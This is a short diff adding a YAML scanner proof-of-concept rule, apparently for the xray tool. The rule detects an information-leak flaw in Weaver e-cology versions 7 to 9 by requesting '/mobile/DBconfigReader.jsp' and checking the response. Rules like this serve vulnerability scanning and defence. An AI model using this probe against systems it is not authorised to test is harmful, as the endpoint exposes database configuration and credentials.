@@ -1,0 +1,12 @@
+name: poc-yaml-ecology-info-leak
+rules:
+  - method: GET
+    path: "/mobile/DBconfigReader.jsp"
+    expression: |
+      status == 200 && body.bcontains(b'~p')
+
+detail:
+  author: violin
+  e-cology: 包括不限于EC7.0、EC8.0、EC9.0
+  links:
+    - https://mp.weixin.qq.com/s/u8GIfMBRZFAN3HANSSSgQA
